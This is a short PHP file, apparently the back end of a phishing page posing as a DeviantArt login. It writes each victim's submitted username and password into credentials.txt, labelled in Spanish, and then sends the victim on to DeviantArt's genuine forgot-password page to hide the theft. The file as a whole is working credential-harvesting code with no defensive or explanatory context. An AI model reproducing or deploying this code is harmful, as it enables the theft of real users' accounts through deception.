<?php

file_put_contents("credentials.txt", "[+] Deviantart -> Usiaro: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.deviantart.com/users/forgot/');
exit();
?>
